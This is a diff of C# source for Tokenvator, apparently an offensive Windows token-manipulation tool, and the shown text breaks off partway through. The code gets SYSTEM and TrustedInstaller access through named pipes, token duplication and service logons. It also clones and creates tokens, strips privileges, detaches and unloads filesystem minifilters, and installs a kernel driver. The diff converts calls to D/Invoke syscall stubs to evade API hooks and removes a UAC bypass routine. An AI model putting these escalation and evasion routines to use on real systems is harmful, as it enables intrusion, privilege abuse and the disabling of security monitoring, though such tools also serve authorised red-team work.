@@ -1,12 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Runtime.ExceptionServices;
+using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.Principal;
 using System.Threading;
+
+using DInvoke.DynamicInvoke;
 
 using Tokenvator.Resources;
 using Tokenvator.Plugins.AccessTokens;
@@ -16,39 +21,21 @@ using Tokenvator.Plugins.MiniFilters;
 using Tokenvator.Plugins.NamedPipes;
 
 using MonkeyWorks.Unmanaged.Headers;
-using MonkeyWorks.Unmanaged.Libraries;
-using System.IO;
 
 namespace Tokenvator
 {
+    //Using a different using statment to track the changes from P/Invoke to D/Invoke
+    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;
+
     partial class MainLoop
     {
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Adds a privilege via the token driver
+        /// No Conversion Required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _AddGroup(CommandLineParsing cLP, IntPtr hToken)
-        {
-            string groups;
-            if (!cLP.GetData("groups", out groups))
-            {
-                return;
-            }
-
-            using (TokenManipulation t = new TokenManipulation(hToken))
-            {
-                if (cLP.Remote && t.OpenProcessToken(cLP.ProcessID))
-                    t.SetWorkingTokenToRemote();
-                else
-                    t.SetWorkingTokenToSelf();
-
-                t.SetTokenGroup(groups, false);
-            }
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        private static void _AddPrivilege(CommandLineParsing cLP)
+        private void _AddPrivilege()
         {
             TokenDriver.PRIVILEGES priv = Misc.ParseEnum<TokenDriver.PRIVILEGES>(cLP.Privilege);
 
@@ -79,11 +66,15 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Enables, Disables, or Removes a privilege from a Token
+        /// <summary>
+        /// Enables, Disables, or Removes a privilege from a Token
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _AlterPrivilege(CommandLineParsing cLP, IntPtr hToken, Winnt.TokenPrivileges attribute)
+        private void _AlterPrivilege(Winnt.TokenPrivileges attribute)
         {
-            using (TokenManipulation t = new TokenManipulation(hToken))
+            using (TokenManipulation t = new TokenManipulation(currentProcessToken))
             {
                 if (cLP.Remote && !cLP.Impersonation && t.OpenProcessToken(cLP.ProcessID))
                 {
@@ -108,87 +99,35 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // UAC Token Magic - Deprecated
+        /// <summary>
+        /// Sets the ACL for a desktop and window stations to everyone
+        /// No Conversion Required
+        /// 
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _BypassUAC(CommandLineParsing cLP, IntPtr hToken)
+        private void _ClearDesktopACL()
         {
-            Console.WriteLine("[*] Notice: This no longer working on versions of Windows 10 > 1703");
-            if (cLP.Remote)
+            using (DesktopACL dA = new DesktopACL(currentProcessToken))
             {
-                using (RestrictedToken rt = new RestrictedToken(hToken))
-                {
-                    rt.BypassUAC(cLP.ProcessID, cLP.Command);
-                }
-            }
-            else
-            {
-                string name = WindowsIdentity.GetCurrent().Name;
-                Dictionary<uint, string> uacUsers = UserSessions.EnumerateUserProcesses(true, name);
-                foreach (uint pid in uacUsers.Keys)
-                {
-                    Console.WriteLine("\n[*] Attempting Bypass with PID {0} ({1})", pid, uacUsers[pid]);
-                    using (RestrictedToken rt = new RestrictedToken(hToken))
-                    {
-                        rt.BypassUAC((int)pid, cLP.Command);
-                    }
-                }
-            }
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        private static void _ClearDesktopACL()
-        {
-            using (DesktopACL dA = new DesktopACL())
-            {
+                dA.LoadModule();
                 dA.OpenWindow();
                 dA.OpenDesktop();
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Clones all the attributes of an existing token and creates a new one
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _CloneToken(bool remote, int processID, string command, IntPtr hToken)
-        {
-            if (!remote)
-            {
-                Console.WriteLine("[-] Unable to identify Process ID");
-                return;
-            }
-
-            if (!string.IsNullOrEmpty(command))
-                if (!remote)
-                    Console.WriteLine("[-] Unable to parse {0}", command);
-
-            using (TokenManipulation t = new TokenManipulation(hToken))
-            {
-                if (!t.OpenProcessToken(processID))
-                    return;
-                t.SetWorkingTokenToRemote();
-                if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityDelegation))
-                {
-                    Console.WriteLine("[-] Unable to Duplicate with Delegation, attempting Impersonation");
-                    if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
-                        return;
-                }
-
-                if (!t.AssignPrimaryToken())
-                    return;
-            }
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        private static void _CloneToken(CommandLineParsing cLP, IntPtr hToken)
+        private void _CloneToken()
         {
             try
             {
-                using (CreateTokens ct = new CreateTokens(hToken))
+                using (CreateTokens ct = new CreateTokens(currentProcessToken))
                 {
-                    ct.SetWorkingTokenToSelf();
                     ct.CloneToken(cLP.ProcessID, cLP.Command);
                 }
             }
@@ -199,15 +138,20 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // https://github.com/numbnet/Win32-OpenSSH/blob/8dd7423e13ac0b88b3084ec95bc93ea09dec1fef/contrib/win32/win32compat/win32auth.c
-        // https://github.com/bb107/WinSudo/blob/b2cb7700bd2f7ee59e2ef7f9ca20c2a671ce72a8/PrivilegeHelps/Security.cpp
-        // https://www.exploit-db.com/papers/42556
+        /// <summary>
+        /// Creates a new token
+        ///  https://github.com/numbnet/Win32-OpenSSH/blob/8dd7423e13ac0b88b3084ec95bc93ea09dec1fef/contrib/win32/win32compat/win32auth.c
+        /// https://github.com/bb107/WinSudo/blob/b2cb7700bd2f7ee59e2ef7f9ca20c2a671ce72a8/PrivilegeHelps/Security.cpp
+        /// https://www.exploit-db.com/papers/42556
+        /// No Conversion Required
+        /// 
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _CreateToken(CommandLineParsing cLP, IntPtr hToken)
-        {   
+        private void _CreateToken()
+        {
             try
             {
-                using (CreateTokens ct = new CreateTokens(hToken))
+                using (CreateTokens ct = new CreateTokens(currentProcessToken))
                 {
                     string[] groups = new string[0];
                     string g;
@@ -225,7 +169,7 @@ namespace Tokenvator
                     else
                     {
                         ct.SetWorkingTokenToSelf();
-                        ct.CreateToken(groups, cLP.Command);
+                        ct.CreateToken(cLP.Command);
                     }
                 }
             }
@@ -236,9 +180,94 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Use Native APIs to find processes that a user is running 
+        /// <summary>
+        /// Disables a group on a tokens
+        /// No Conversion Required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _FindUserProcesses(CommandLineParsing cLP)
+        private void _DisableGroup()
+        {
+            string groups;
+            if (!cLP.GetData("groups", out groups))
+            {
+                return;
+            }
+
+            using (TokenManipulation tm = new TokenManipulation(IntPtr.Zero))
+            {
+                if (cLP.Remote && tm.OpenProcessToken(cLP.ProcessID))
+                    tm.SetWorkingTokenToRemote();
+                else
+                    tm.SetWorkingTokenToSelf();
+
+                tm.DisableTokenGroup(groups);
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Detaches a filter instanse
+        /// No Conversion Required
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _FilterDetach()
+        {
+            string filter;
+            if (!cLP.GetData("filter", out filter))
+            {
+                Console.WriteLine("[-] /Filter: Not Specified");
+                return;
+            }
+
+            string volume;
+            if (!cLP.GetData("volume", out volume))
+            {
+                Console.WriteLine("[-] /Volume: Not Specified");
+                return;
+            }
+
+            string instance;
+            if (!cLP.GetData("instance", out instance))
+            {
+                Console.WriteLine("[-] /Instance: Not Specified");
+                return;
+            }
+
+            using (Filters f = new Filters())
+            {
+                f.FilterDetach(filter, volume, instance);
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Unloads a minifilter
+        /// No Conversion Required
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _FilterUnload()
+        {
+            string filter;
+            if (!cLP.GetData("filter", out filter))
+            {
+                Console.WriteLine("[-] Filter Not Specified");
+                return;
+            }
+
+            using (Filters f = new Filters())
+            {
+                f.FilterUnload(filter);
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Use Native APIs to find processes that a user is running 
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _FindUserProcesses()
         {
             string user;
             if (!cLP.GetData("username", out user))
@@ -246,7 +275,7 @@ namespace Tokenvator
                 Console.WriteLine("[-] Username not specified");
                 return;
             }
-            Dictionary<uint, string> processes = UserSessions.EnumerateUserProcesses(false, user);
+            Dictionary<uint, string> processes = UserSessions.EnumerateUserProcesses(user);
             Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
             Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
             foreach (uint pid in processes.Keys)
@@ -256,9 +285,13 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Use WMI to find processes that a user is running 
+        /// <summary>
+        /// Use WMI to find processes that a user is running 
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _FindUserProcessesWMI(CommandLineParsing cLP)
+        private void _FindUserProcessesWMI()
         {
             string user;
             if (!cLP.GetData("username", out user))
@@ -276,72 +309,132 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Impersonates a SYSTEM token or creates a new process with the cloned token
+        /// <summary>
+        /// Impersonates a SYSTEM token or creates a new process with the duplicated token
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _GetSystem(CommandLineParsing cLP, IntPtr hToken)
+        private void _GetSystem()
         {
-            bool exists, enabled;
-            TokenInformation.CheckTokenPrivilege(hToken, "SeDebugPrivilege", out exists, out enabled);
-
-            if (exists)
+            using (TokenInformation ti = new TokenInformation(currentProcessToken))
             {
-                using (TokenManipulation t = new TokenManipulation(hToken))
+                ti.SetWorkingTokenToSelf();
+                if (!ti.CheckTokenPrivilege(Winnt.SE_DEBUG_NAME) || cLP.Legacy)
                 {
-                    t.SetWorkingTokenToSelf();
-
-                    if (!enabled)
+                    using (NamedPipes np = new NamedPipes())
                     {
-                        t.SetTokenPrivilege(Winnt.SE_DEBUG_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);
+                        if (string.IsNullOrEmpty(cLP.Command))
+                        {
+                            np.GetSystem();
+                        }
+                        else
+                        {
+                            np.GetSystem(cLP.Command, cLP.Arguments);
+                        }
                     }
-
-                    
-                    if (string.IsNullOrEmpty(cLP.Command))
-                        t.GetSystem();
-                    else
-                        t.GetSystem(cLP.CommandAndArgs);
                 }
-            }
-            else
-            {
-                if (string.IsNullOrEmpty(cLP.Command))
-                    NamedPipes.GetSystem();
                 else
-                    NamedPipes.GetSystem(cLP.Command, cLP.Arguments);
+                {
+                    using (TokenManipulation t = new TokenManipulation(currentProcessToken))
+                    {
+                        t.SetWorkingTokenToSelf();
+
+                        if (string.IsNullOrEmpty(cLP.Command))
+                            t.GetSystem();
+                        else
+                            t.GetSystem(cLP.CommandAndArgs);
+                    }
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Starts Windows Module Installer and impersonates or starts a process with 
-        // the cloned token. There are better ways of doing this net .O
+        /// <summary>
+        /// Delegates out to _GetTrustedInstallerLogon and _GetTrustedInstallerService
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="currentProcessToken"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _GetTrustedInstaller(CommandLineParsing cLP, IntPtr hToken)
+        private void _GetTrustedInstaller()
         {
-            bool exists, enabled;
-            TokenInformation.CheckTokenPrivilege(hToken, "SeDebugPrivilege", out exists, out enabled);
-
-            if (exists)
+            if (cLP.Legacy)
             {
-                using (TokenManipulation t = new TokenManipulation(hToken))
-                {
-                    t.SetWorkingTokenToSelf();
-
-                    if (!enabled)
-                        t.SetTokenPrivilege(Winnt.SE_DEBUG_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);
-
-                    if (string.IsNullOrEmpty(cLP.Command))
-                        t.GetTrustedInstaller();
-                    else
-                        t.GetTrustedInstaller(cLP.CommandAndArgs);
-                }
+                _GetTrustedInstallerService();
             }
             else
             {
-                Console.WriteLine("[-] SeDebugPrivilege Is Not Assigned to Token");
+                _GetTrustedInstallerLogon();
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Help Menue Wrapper
+        /// <summary>
+        /// Calls LogonUserExExW with NT SERVICE\TrustedInstaller listed as a group
+        /// No Conversion Required
+        /// Need to get SYSTEM first
+        /// QA OK
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="currentProcessToken"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _GetTrustedInstallerLogon()
+        {
+            using (CreateTokens ct = new CreateTokens())
+            {
+                ct.LogonUser(
+                    "NT AUTHORITY",
+                    "SYSTEM",
+                    string.Empty,
+                    "NT SERVICE\\TrustedInstaller",
+                     Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE,
+                     cLP.Command,
+                     cLP.Arguments
+                );
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Starts Windows Module Installer and impersonates or starts a process with 
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="currentProcessToken"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _GetTrustedInstallerService()
+        {
+            using (TokenInformation ti = new TokenInformation(currentProcessToken))
+            {
+                ti.SetWorkingTokenToSelf();
+                if (!ti.CheckTokenPrivilege(Winnt.SE_DEBUG_NAME))
+                {
+                    Console.WriteLine("[-] Unable to proceed");
+                    return;
+                }
+                else
+                {
+                    using (TokenManipulation tm = new TokenManipulation(currentProcessToken))
+                    {
+                        tm.SetWorkingTokenToSelf();
+                        if (string.IsNullOrEmpty(cLP.Command))
+                            tm.GetTrustedInstaller();
+                        else
+                            tm.GetTrustedInstaller(cLP.CommandAndArgs);
+                    }
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Help Menu Wrapper
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         private static void _Help(string input)
         {
@@ -353,11 +446,15 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Displays various token information
+        /// <summary>
+        /// Displays various token information
+        /// No Conversion Required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _Info(CommandLineParsing cLP, IntPtr hToken)
+        private void _Info()
         {
-            using (TokenInformation t = new TokenInformation(hToken))
+            using (TokenInformation t = new TokenInformation(currentProcessToken))
             {
                 if (cLP.Remote)
                 {
@@ -372,11 +469,11 @@ namespace Tokenvator
                     t.SetWorkingTokenToSelf();
                 }
 
-                hToken = t.GetWorkingToken();
+                //currentProcessToken = t.GetWorkingToken();
 
                 Console.WriteLine("[*] Primary Token");
                 t.GetTokenUser();
-                
+
                 Console.WriteLine();
 
                 Console.WriteLine("[*] Impersonation Tokens");
@@ -398,30 +495,34 @@ namespace Tokenvator
                 {
                     t.GetTokenSource();
                     Console.WriteLine();
-                    
+
                     t.GetTokenPrivileges();
                     Console.WriteLine();
-                    
+
                     t.GetTokenOwner();
                     Console.WriteLine();
-                    
+
                     t.GetTokenPrimaryGroup();
                     Console.WriteLine();
-                    
+
                     t.GetTokenDefaultDacl();
                     Console.WriteLine();
 
-                    Winnt._TOKEN_TYPE tokenType;
-                    TokenInformation.GetElevationType(hToken, out tokenType);
-                    TokenInformation.PrintElevation(hToken);
+                    t.GetTokenType();
+
+                    t.GetTokenElevation(true);
                 }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // sc create TokenDriver binPath="C:\Windows\System32\kerneltokens.sys" type=kernel
+        /// <summary>
+        /// Installs the Token Driver
+        /// sc create TokenDriver binPath="C:\Windows\System32\kerneltokens.sys" type=kernel
+        /// No Conversion Required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _InstallDriver(CommandLineParsing cLP)
+        private void _InstallDriver()
         {
             //string servicename = Misc.NextItem(ref command);
             //string path = Misc.NextItem(ref command);
@@ -508,48 +609,136 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Module to check if a process is marked as critical
+        /// <summary>
+        /// Module to check if a process is marked as critical
+        /// Converted to a mix of D/Invoke Syscalls and GetPebLdrModuleEntry/GetExportAddress
+        /// QA OK
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="hProcess"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _IsCriticalProcess(CommandLineParsing cLP, IntPtr hProcess)
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        private void _IsCriticalProcess()
         {
+            IntPtr hProcess = new IntPtr(-1);
+
             if (cLP.Remote)
             {
-                hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, (uint)cLP.ProcessID);
-                if (IntPtr.Zero == hProcess)
+                ////////////////////////////////////////////////////////////////////////////////
+                // kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, (uint)cLP.ProcessID);
+                ////////////////////////////////////////////////////////////////////////////////
+                IntPtr hNtOpenProcess = Generic.GetSyscallStub("NtOpenProcess");
+                var fSyscallNtOpenProcess = (MonkeyWorks.ntdll.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.ntdll.NtOpenProcess));
+
+                MonkeyWorks.ntdll.OBJECT_ATTRIBUTES objectAttributes = new MonkeyWorks.ntdll.OBJECT_ATTRIBUTES();
+                ntbasic.CLIENT_ID clientId = new ntbasic.CLIENT_ID
                 {
-                    Misc.GetWin32Error("OpenProcess");
+                    UniqueProcess = new IntPtr(cLP.ProcessID)
+                };
+
+                uint ntRetVal = 0;
+                try
+                {
+                    ntRetVal = fSyscallNtOpenProcess(ref hProcess, ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_LIMITED_INFORMATION, ref objectAttributes, ref clientId);
+                }
+                catch (Exception ex)
+                {
+                    Misc.GetExceptionMessage(ex, "NtOpenProcess");
+                    return;
+                }
+
+                if (0 != ntRetVal)
+                {
+                    Misc.GetNtError("NtOpenProcess", ntRetVal);
                     return;
                 }
             }
 
-            bool bIsCritical = false;
-            if (!kernel32.IsProcessCritical(hProcess, ref bIsCritical))
+            Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // kernel32.IsProcessCritical(hProcess, ref bIsCritical)
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hKernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
+            IntPtr hGetProcAddress = Generic.GetExportAddress(hKernel32, "GetProcAddress");
+            var fGetProcAddress = (MonkeyWorks.kernel32.GetProcAddress)Marshal.GetDelegateForFunctionPointer(hGetProcAddress, typeof(MonkeyWorks.kernel32.GetProcAddress));
+
+            IntPtr hIsProcessCritical = IntPtr.Zero;
+            try
+            {
+                hIsProcessCritical = fGetProcAddress(hKernel32, "IsProcessCritical");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] IsProcessCritical Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+
+            }
+
+            //IntPtr hIsProcessCritical = Generic.GetExportAddress(hKernel32, "IsProcessCritical");
+            var fIsProcessCritical = (MonkeyWorks.kernel32.IsProcessCritical)Marshal.GetDelegateForFunctionPointer(hIsProcessCritical, typeof(MonkeyWorks.kernel32.IsProcessCritical));
+
+            bool bCritical = true;
+            bool retVal = false;
+            try
+            {
+                retVal = fIsProcessCritical(hProcess, ref bCritical);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] IsProcessCritical Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+
+            }
+
+            if (!retVal)
             {
                 Misc.GetWin32Error("IsProcessCritical");
-                kernel32.CloseHandle(hProcess);
+                //AccessTokens.CloseHandle(hProcess);
                 return;
             }
-            Console.WriteLine("[*] Process Critical State: {0}", bIsCritical);
-            kernel32.CloseHandle(hProcess);
+            Console.WriteLine("[*] Process Critical State: {0}", bCritical);
+            //AccessTokens.CloseHandle(hProcess);
             return;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // List the loaded minifilters
+        /// <summary>
+        /// List the loaded minifilters
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _ListFilters()
+        private void _ListFilters()
         {
-            using (Filters filters = new Filters())
+            using (Filters f = new Filters())
             {
-                filters.First();
-                filters.Next();
+                if (!f.Load())
+                {
+                    return;
+                }
+
+                if (!f.First())
+                {
+                    return;
+                }
+
+                if (!f.Next())
+                {
+                    return;
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // List the instances / volumes attached to for a given minifilter
+        /// <summary>
+        /// List the instances / volumes attached to for a given minifilter
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _ListFiltersInstances(CommandLineParsing cLP)
+        private void _ListFiltersInstances()
         {
             string filter;
             if (!cLP.GetData("filter", out filter))
@@ -558,21 +747,38 @@ namespace Tokenvator
                 return;
             }
 
-            using (FilterInstance filterInstance = new FilterInstance(filter))
+            using (FilterInstance fi = new FilterInstance(filter))
             {
-                filterInstance.First();
-                filterInstance.Next();
+                if (!fi.Load())
+                {
+                    return;
+                }
+
+                if (!fi.First())
+                {
+                    return;
+                }
+
+                if (!fi.Next())
+                {
+                    return;
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // List the privileges for a token
+        /// <summary>
+        /// List the privileges for a token
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _ListPrivileges(CommandLineParsing cLP, IntPtr hToken)
+        private void _ListPrivileges()
         {
             Console.WriteLine("Remote: " + cLP.Remote);
             Console.WriteLine("Impers: " + cLP.Impersonation);
-            using (TokenInformation ti = new TokenInformation(hToken))
+
+            using (TokenInformation ti = new TokenInformation(currentProcessToken))
             {
                 if (cLP.Remote && !cLP.Impersonation && ti.OpenProcessToken(cLP.ProcessID))
                 {
@@ -599,9 +805,39 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// 
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _LogonUser(CommandLineParsing cLP, IntPtr hToken)
+        private void _ListAllTokens()
+        {
+            using (TokenInformation ti = new TokenInformation(currentProcessToken))
+            {
+                foreach (var p in Process.GetProcesses())
+                {
+                Console.WriteLine("\n[*] {0,-8} {1}", p.Id, p.ProcessName);
+                
+                    if (!ti.OpenProcessToken(p.Id, false))
+                    {
+                        continue;   
+                    }
+                    ti.SetWorkingTokenToRemote();
+
+                    Console.WriteLine(ti.GetTokenUser(false));
+                    ti.ListThreads(p.Id);
+                    ti.GetThreadUsers(false);
+                }
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Logs on a user, can be used with virtual service accounts
+        /// No conversions required
+        /// QA OK
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _LogonUser()
         {
             string username;
             if (!cLP.GetData("username", out username))
@@ -619,6 +855,7 @@ namespace Tokenvator
                 username = split.LastOrDefault();
                 if (!cLP.GetData("password", out password))
                 {
+                    Console.WriteLine("[-] Password Not Set");
                     return;
                 }
                 Console.WriteLine("User Logon");
@@ -628,8 +865,8 @@ namespace Tokenvator
                 string[] split = username.Split('\\').ToArray();
                 username = split.LastOrDefault();
                 logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
+                Console.WriteLine("[*] Setting Logon Type to Serivce");
                 domain = "NT SERVICE";
-                Console.WriteLine("Service Logon");
             }
             else
             {
@@ -639,16 +876,19 @@ namespace Tokenvator
                         username = "LocalService";
                         logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                         domain = "NT AUTHORITY";
+                        Console.WriteLine("[*] Setting Logon Type to Serivce");
                         break;
                     case "localsystem":
-                        username = "LocalSystem";
+                        username = "SYSTEM";//"LocalSystem";
                         logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                         domain = "NT AUTHORITY";
+                        Console.WriteLine("[*] Setting Logon Type to Serivce");
                         break;
                     case "networkservice":
                         username = "Network Service";
                         logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                         domain = "NT AUTHORITY";
+                        Console.WriteLine("[*] Setting Logon Type to Serivce");
                         break;
                     default:
                         cLP.GetData("password", out password);
@@ -656,48 +896,95 @@ namespace Tokenvator
                 }
             }
 
-            using (TokenManipulation t = new TokenManipulation(hToken))
+            using (CreateTokens ct = new CreateTokens(currentProcessToken))
             {
                 string groups;
                 if (cLP.GetData("groups", out groups))
                 {
-                    t.LogonUser(domain, username, password, groups, logonType, cLP.Command, cLP.Arguments);
+                    ct.LogonUser(domain, username, password, groups, logonType, cLP.Command, cLP.Arguments);
                 }
                 else
                 {
-                    t.LogonUser(domain, username, password, logonType, cLP.Command, cLP.Arguments);
+                    ct.LogonUser(domain, username, password, logonType, cLP.Command, cLP.Arguments);
                 }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Disable and remove all the privileges on a given token
+        /// <summary>
+        /// Disable and remove all the privileges on a given token
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _NukePrivileges(CommandLineParsing cLP, IntPtr hToken)
+        private void _NukePrivileges()
         {
-            using (TokenManipulation t = new TokenManipulation(hToken))
+            using (TokenInformation ti = new TokenInformation(currentProcessToken))
             {
                 if (cLP.Remote)
                 {
-                    t.SetWorkingTokenToRemote();
-                    if (!t.OpenProcessToken(cLP.ProcessID))
+                    if (!ti.OpenProcessToken(cLP.ProcessID))
                     {
                         return;
                     }
+                    ti.SetWorkingTokenToRemote();
                 }
                 else
                 {
-                    t.SetWorkingTokenToSelf();
+                    ti.SetWorkingTokenToSelf();
                 }
 
-                t.DisableAndRemoveAllTokenPrivileges();
+                ti.GetTokenPrivileges();
+                using (TokenManipulation tm = new TokenManipulation(ti.GetWorkingToken()))
+                {
+                    tm.SetWorkingTokenToSelf();
+
+                    foreach (string privilege in ti.Privileges)
+                    {
+                        int index = CommandLineParsing.Privileges.FindIndex(x => x.Equals(privilege, StringComparison.OrdinalIgnoreCase));
+                        if (-1 != index)
+                        {
+                            if (!tm.SetTokenPrivilege(CommandLineParsing.Privileges[index], Winnt.TokenPrivileges.SE_PRIVILEGE_REMOVED))
+                            {
+                                tm.SetTokenPrivilege(CommandLineParsing.Privileges[index], Winnt.TokenPrivileges.SE_PRIVILEGE_NONE);
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("[-] Privilege \"{0}\" not indexed", privilege);
+                            Console.WriteLine("[-] A bug report would be appreciated");
+                        }
+                        Thread.Sleep(1000);
+                    }
+                }
+
+                ti.GetTokenPrivileges();
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Reverts to self
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _SampleProcess()
+        private void _RevertToSelf()
+        {
+            using (TokenManipulation tm = new TokenManipulation())
+            {
+                Console.WriteLine(tm.RevertToSelf() ? "[*] Reverted token to " + WindowsIdentity.GetCurrent().Name : "[-] RevertToSelf failed");
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Finds all logged on users
+        /// No conversions required
+        /// QA OK
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        private void _SampleProcess()
         {
             Dictionary<string, uint> users = UserSessions.EnumerateTokens(false);
             Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
@@ -709,9 +996,13 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Finds all logged on users via WMI
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _SampleProcessWMI()
+        private void _SampleProcessWMI()
         {
             Dictionary<string, uint> users = UserSessions.EnumerateTokensWMI();
             Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
@@ -723,10 +1014,20 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Marks or unmarks a process as being critical
+        /// <summary>
